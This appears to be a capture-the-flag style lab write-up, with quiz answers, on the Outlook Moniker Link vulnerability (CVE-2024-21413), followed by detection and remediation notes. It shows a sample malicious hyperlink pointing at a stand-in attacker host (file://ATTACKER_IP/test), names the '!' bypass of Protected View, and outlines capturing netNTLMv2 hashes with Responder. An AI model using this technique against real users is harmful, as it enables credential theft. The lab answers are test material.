# Moniker Link (CVE-2024-21413)

## Task 01: Introduction

### Description

- On February 13th, 2024, Microsoft announced a Microsoft Outlook RCE & credential leak vulnerability with the assigned CVE of CVE-2024-21413(opens in new tab) (Moniker Link).
- The vulnerability bypasses Outlook's security mechanisms when handing a specific type of hyperlink known as a Moniker Link.
- An attacker can abuse this by sending an email that contains a malicious Moniker Link to a victim, resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.

#### Question

What "Severity" rating has the CVE been assigned?

#### Answer

Critical

## Task 02: MonikerLink(CVE-2024-21413)

### Description

- By using the file:// Moniker Link in our hyperlink, we can instruct Outlook to attempt to access a file, such as a file on a network share (<a href="file://ATTACKER_IP/test">Click me</a>).
- However, Outlook's "Protected View" catches and blocks this attempt.
- The vulnerability here exists by modifying our hyperlink to include the ! special character and some text in our Moniker Link which results in bypassing Outlook’s Protected View. 

#### Question

What Moniker Link type do we use in the hyperlink?

#### Answer

file://

#### Question

What is the special character used to bypass Outlook's "Protected View"?

#### Answer

!

## Task 03: Exploitation

### Description

- Use Responder to create an SMB listener on our attacking machine.
- Send a exploit python script to target VM.
- Capture victim's netNTLMv2 hash on AttackBox.

#### Question

What is the name of the application that we use on the AttackBox to capture the user's hash?

#### Answer

responder

#### Question

What type of hash is captured once the hyperlink in the email has been clicked?

#### Answer

netNTLMv2

## Task 04: Detection

### Description

- A Yara rule used to detect emails containing the file:\\ element in the Moniker Link. https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar
- Wireshark: Additionally, the SMB request from the victim to the client can be seen in a packet capture with a truncated netNTLMv2 hash.

## Task 05: Remediation

### Description

- Microsoft has included patches to resolve this vulnerability in February’s “patch Tuesday” release.
- Since this vulnerability bypasses Outlook's Protected View, there is no way to reconfigure Outlook to prevent this attack.
- Additionally, preventing the SMB protocol entirely may do more harm than good, especially as it is essential for accessing network shares.
- However, you may be able to block this at the firewall level, depending on the organisation.
